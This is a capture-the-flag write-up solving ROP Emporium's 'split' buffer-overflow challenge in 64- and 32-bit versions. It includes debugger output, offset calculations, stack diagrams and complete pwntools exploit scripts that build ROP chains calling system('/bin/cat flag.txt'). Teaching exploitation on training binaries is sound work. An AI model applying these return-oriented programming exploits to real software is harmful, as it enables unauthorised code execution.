---
custom_edit_url: null
sidebar_position: 2
---

:::note
I will be using pwndbg to solve the 64 bit and the 32 bit. You can use [this](https://infosecwriteups.com/pwndbg-gef-peda-one-for-all-and-all-for-one-714d71bf36b8) walkthrough to install both of those plugins. 
:::

## 64 bit

Let's run the executable to check what it does.

```
$ ./split
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> 1111111
Thank you!

Exiting
```

It takes user input and then exits.


We can use the `checksec` utility in order to identify the security properties of the binary executable.
```
$ checksec split
[*] '/home/hacker/ropEmporium/split/split'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

There's two important properties we want to focus on here:
	- `NX enabled`: This means that the stack is not executable. Therefore we cannot use a shellcode injection.
	- `No PIE (0x400000)`: This means that the executable is not positionally independent and it is always loaded at address `0x400000`. So the code and memory regions will have the same address every time we run it. 

Let's open the executable using `gdb-pwndbg` and look at the functions.

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400742  usefulFunction
0x0000000000400760  __libc_csu_init
0x00000000004007d0  __libc_csu_fini
0x00000000004007d4  _fini
```

There is a function called `usefulFunction`. Let's disassemble it and see how useful it is.

### `usefulFunction()`

```
pwndbg> disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:     push   rbp
   0x0000000000400743 <+1>:     mov    rbp,rsp
   0x0000000000400746 <+4>:     mov    edi,0x40084a
   0x000000000040074b <+9>:     call   0x400560 <system@plt>
   0x0000000000400750 <+14>:    nop
   0x0000000000400751 <+15>:    pop    rbp
   0x0000000000400752 <+16>:    ret
End of assembler dump.
```

We can see that the instruction at `usefulFunction()+9` makes a system call and that the instruction at `usefulFunction()+4` loads the argument.

```
pwndbg> x/s 0x40084a
0x40084a:       "/bin/ls"
```

So this system call executes `/bin/ls` which isn't what we want. We want it to execute `/bin/cat flag.txt`.

### `/bin/cat flag.txt`

Let's search the string `/bin/cat flag.txt`.

```
pwndbg> search /bin/cat
Searching for value: '/bin/cat'
split           0x601060 '/bin/cat flag.txt'
```

We can link this string with our system call in order to read the `flag.txt` file.

In order to put this string into `rdi`, we will need a `pop rdi ; ret` gadget.

### `pop rdi ; ret` gadget

We can find the gadget using the `ROPgadget` utility. 

```
$ ROPgadget --binary split | grep "pop rdi ; ret"
0x00000000004007c3 : pop rdi ; ret
```

We can see that the address of the `pop rdi ; ret` gadget is `0x00000000004007c3`. 

### Cyclic pattern

We now have to find the offset using a cyclic pattern.

```
pwndbg> cyclic
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```

Let's provide this as input.

```
pwndbg> run
Starting program: /home/kunal/ropemporium/split/split
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400741 in pwnme ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 RAX  0xb
 RBX  0
 RCX  0x7ffff7ea1887 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  1
 RDI  0x7ffff7fa9a70 (_IO_stdfile_1_lock) ◂— 0
 RSI  1
 R8   0xa
 R9   0x7ffff7fc9040 (_dl_fini) ◂— endbr64
 R10  0x7ffff7d935e8 ◂— 0xf001200001a64
 R11  0x246
 R12  0x7fffffffdda8 —▸ 0x7fffffffdfee ◂— '/home/kunal/ropemporium/split/split'
 R13  0x400697 (main) ◂— push rbp
 R14  0
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x6161616161616165 ('eaaaaaaa')
 RSP  0x7fffffffdc88 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
 RIP  0x400741 (pwnme+89) ◂— ret
──────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────
 ► 0x400741 <pwnme+89>    ret                                <0x6161616161616166>
    ↓









───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc88 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
01:0008│     0x7fffffffdc90 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
02:0010│     0x7fffffffdc98 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
03:0018│     0x7fffffffdca0 ◂— 'iaaaaaaajaaaaaaakaaaaaaalaaaaaaa'
04:0020│     0x7fffffffdca8 ◂— 'jaaaaaaakaaaaaaalaaaaaaa'
05:0028│     0x7fffffffdcb0 ◂— 'kaaaaaaalaaaaaaa'
06:0030│     0x7fffffffdcb8 ◂— 'laaaaaaa'
07:0038│     0x7fffffffdcc0 ◂— 0
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0         0x400741 pwnme+89
   1 0x6161616161616166
   2 0x6161616161616167
   3 0x6161616161616168
   4 0x6161616161616169
   5 0x616161616161616a
   6 0x616161616161616b
   7 0x616161616161616c
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Once the frame is collapsed, the `rbp` register has the value `0x6161616161616165` which is the ASCII representaion of `eaaaaaaa` in little endian format.

Let's find the offset of this value in our cyclic pattern.

```
pwndbg> cyclic -l 0x6161616161616165
Finding cyclic pattern of 8 bytes: b'eaaaaaaa' (hex: 0x6561616161616161)
Found at offset 32
```

So the offset is 32 bytes.

Let's see how this looks on the stack.

### Stack

```
<==: Value is stored at the address
<--: Points to the address

                        ┌───────────────────────────┐
     rsp --> buffer ==> │  61 61 61 61 61 61 61 61  │ 
                        │  62 61 61 61 61 61 61 61  │ 
                        │  63 61 61 61 61 61 61 61  │
                        │  64 61 61 61 61 61 61 61  │
                        ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
 rbp --> stored rbp ==> │  65 61 61 61 61 61 61 61  │  
                        ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
     return address ==> │  66 61 61 61 61 61 61 61  │ 
                        └───────────────────────────┘
                        ╎  .. .. .. .. .. .. .. ..  ╎
```

We can see that if we increment the `rbp` by 8, it will point to the saved return address.

Therefore the distance between the buffer and the saved return address is `offset+8` which is equal to 40.

### Exploit requirements

We have all the knowledge we need to create an exploit.
	- [x] Number of padding bytes: `40`
	- [x] Address of `pop rdi ; ret` gadget: `0x00000000004007c3`
	- [x] Address of `/bin/cat flag.txt`: `0x601060`
	- [x] Address of `call <system@plt>`: `0x000000000040074b`
 
All that remains is to link these pieces of information to create a ROP chain.

### ROP chain

In this technique, we have to execute our instructions in a carefully chosen sequence:
	1. First we have to replace the `return address` with the address of the `pop rdi` gadget so that it is executed when `pwnme` returns.
	2. Then we have to chain it with the address of the `/bin/cat flag.txt` string so that it gets popped into the `rdi register`.
	3. Finally we chain it with the address of the `system@plt` call.

This is what the ROP chain would look like on the stack.

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
rsp --> return address ==> │  00 00 00 00 00 40 07 c3  │ --> pop rdi ; ret
			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
			   │  00 00 00 00 00 60 10 60  │ --> /bin/cat flag.txt
			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
			   │  00 00 00 00 00 40 07 4b  │ --> call <system@plt>
			   └───────────────────────────┘
			   ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pwnme() return
	// Pop the value pointed to by rsp into rip and move rsp by 8 bytes.
═══════════════════════════════════════════════════════════════════════════════════

Stack:
			   ┌───────────────────────────┐
         	   rsp --> │  00 00 00 00 00 60 10 60  │ --> /bin/cat flag.txt
			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
			   │  00 00 00 00 00 40 07 4b  │ --> call <system@plt>     
			   └───────────────────────────┘
			   ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi
	// Pop the value pointed to by rsp into rdi and move the rsp by 8 bytes.
═══════════════════════════════════════════════════════════════════════════════════

Stack:
			   ┌───────────────────────────┐
		   rsp --> │  00 00 00 00 00 40 07 4b  │ --> call <system@plt>
			   └───────────────────────────┘
			   ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x601060

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
	// Pop the address of system@plt pointed to by rsp into rip and move rsp
        // by 8 bytes.
═══════════════════════════════════════════════════════════════════════════════════

Stack:
			   ┌───────────────────────────┐
		   rsp --> │  .. .. .. .. .. .. .. ..  │ 
			   └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x601060

═══════════════════════════════════════════════════════════════════════════════════
rip --> call <system@plt>
	// Call system@plt with the argument that is stored in the rdi register.
═══════════════════════════════════════════════════════════════════════════════════
```

### Exploit

```python title="exploit64.py"
from pwn import *

padding = b"a"*40
poprdi_addr = p64(0x00000000004007c3)
bincat_addr = p64(0x601060)
system_addr = p64(0x000000000040074b)

payload = padding + poprdi_addr + bincat_addr + system_addr

p = process('./split')
p.sendline(payload) 
p.interactive()
```

Let's run the exploit.

```
$ python exploit64.py 
[+] Starting local process './split': pid 987
[*] Switching to interactive mode
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```

&nbsp;

## 32 bit

### `usefulFunction()`

```
pwndbg> disassemble usefulFunction
Dump of assembler code for function usefulFunction:
   0x0804860c <+0>:     push   ebp
   0x0804860d <+1>:     mov    ebp,esp
   0x0804860f <+3>:     sub    esp,0x8
   0x08048612 <+6>:     sub    esp,0xc
   0x08048615 <+9>:     push   0x804870e
   0x0804861a <+14>:    call   0x80483e0 <system@plt>
   0x0804861f <+19>:    add    esp,0x10
   0x08048622 <+22>:    nop
   0x08048623 <+23>:    leave
   0x08048624 <+24>:    ret
End of assembler dump.
```

The arguments for a 32-bit function call are pushed on the stack. At `usefulFunction+9`, we can see the argument for the system call being pushed onto the stack.

Let's see what the argument is.

```
pwndbg> x/s 0x804870e
0x804870e:      "/bin/ls"
```

We have to replace this argument with `/bin/cat flag.txt`.

### `/bin/cat flag.txt`

```
pwndbg> search /bin/cat
Searching for value: '/bin/cat'
split32         0x804a030 '/bin/cat flag.txt'
```

We can link this string with our system call in order to read the `flag.txt` file.

In this case we do not need a `pop rdi` gadget because as we saw the arguments are not stored in registers.

### Cyclic pattern

We now have to find the offset using a cyclic pattern.

```gdb
pwndbg> cyclic
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Let's provide this as input.

```
pwndbg> run
Starting program: /home/kunal/ropemporium/split/split32
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────
 EAX  0xb
 EBX  0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x229dac
 ECX  0xf7fae9b4 (_IO_stdfile_1_lock) ◂— 0
 EDX  1
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0
 ESI  0xffffceb4 —▸ 0xffffcfea ◂— '/home/kunal/ropemporium/split/split32'
 EBP  0x6161616b ('kaaa')
 ESP  0xffffcde0 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa'
 EIP  0x6161616c ('laaa')
───────────────────────────────────────────[ DISASM / i386 / set emulate on ]───────────────────────────────────────────
Invalid address 0x6161616c










───────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────
00:0000│ esp 0xffffcde0 ◂— 'maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa'
01:0004│     0xffffcde4 ◂— 'naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa'
02:0008│     0xffffcde8 ◂— 'oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaa'
03:000c│     0xffffcdec ◂— 'paaaqaaaraaasaaataaauaaavaaawaaaxaaa'
04:0010│     0xffffcdf0 ◂— 'qaaaraaasaaataaauaaavaaawaaaxaaa'
05:0014│     0xffffcdf4 ◂— 'raaasaaataaauaaavaaawaaaxaaa'
06:0018│     0xffffcdf8 ◂— 'saaataaauaaavaaawaaaxaaa'
07:001c│     0xffffcdfc ◂— 'taaauaaavaaawaaaxaaa'
─────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────
 ► 0 0x6161616c
   1 0x6161616d
   2 0x6161616e
   3 0x6161616f
   4 0x61616170
   5 0x61616171
   6 0x61616172
   7 0x61616173
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

When the frame is collapsed, the `ebp` register has the value `0x6161616b` which is the ASCII representation of `kaaa` in little endian format.

Let's find the offset of this value in our cyclic pattern.

```
pwndbg> cyclic -l 0x6161616b
Finding cyclic pattern of 8 bytes: b'kaaa' (hex: 0x6161616b)
Found at offset 40
```

So the offset is 40 bytes.

Let's see how this looks on the stack.

### Stack
```
<== Value is stored at the address
<-- Points to the address

                       ┌───────────────┐   
    esp --> buffer ==> │  61 61 61 61  │ 
                       │  62 61 61 61  │ 
                       │  63 61 61 61  │
                       │  64 61 61 61  │
                       │  65 61 61 61  │
                       │  66 61 61 61  │
                       │  67 61 61 61  │
                       │  68 61 61 61  │
                       │  69 61 61 61  │
                       │  6A 61 61 61  │
                       ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
ebp --> stored ebp ==> │  6B 61 61 61  │ 
                       ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤ 
    return address ==> │  6C 61 61 61  │ 
                       └───────────────┘
                       ╎  .. .. .. ..  ╎
```

We can see that if we increment the `ebp` by 4, it will point to the saved return address.

Therefore the distance between the buffer and the saved return address is `offset+4` which is equal to 44.

### Exploit requirements

We have all the knowledge we need to create an exploit.
	- [x] Number of padding bytes: `44`
	- [x] Address of `/bin/cat flag.txt`: `0x804a030`
	- [x] Address of `call <system@plt>`: `0x0804861a`
 
All that remains is to link these pieces of information to create a ROP chain.

### ROP chain

In this technique, we have to execute our instructions in a carefully chosen sequence:
	1. First we have to replace the `return address` with the address of the `system@plt` call so that it is executed when `pwnme` returns.
	2. Then we have to chain it with the address of the `/bin/cat flag.txt` string so that it can act as the argument of the `system@plt` call.

This is what the ROP chain would look like on the stack.

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
			   ┌───────────────┐   
esp --> return address ==> │  08 04 86 1a  │ --> call <system@plt>
			   ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
			   │  08 04 a0 30  │ --> /bin/cat flag.txt
			   └───────────────┘
			   ╎  .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
eip --> pwnme() return
	// Pop the value pointed to by esp into eip and move esp by 4 bytes.
═══════════════════════════════════════════════════════════════════════════════════

Stack:
			   ┌───────────────┐
		   esp --> │  08 04 a0 30  │ --> /bin/cat flag.txt
			   └───────────────┘
			   ╎  .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
eip --> call <system@plt>
	// Call system@plt with the argument that is pointed to by the esp.
═══════════════════════════════════════════════════════════════════════════════════
```

### Exploit

```python title="exploit32.py"
from pwn import *

padding = b"a"*44
bincat_addr = p32(0x804a030)
system_addr = p32(0x0804861a)

payload = padding + system_addr + bincat_addr

p = process('./split32')
p.sendline(payload) 
p.interactive()
```

Let's run the exploit.

```
$ python exploit32.py 
[+] Starting local process './split32': pid 16511
[*] Switching to interactive mode
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```
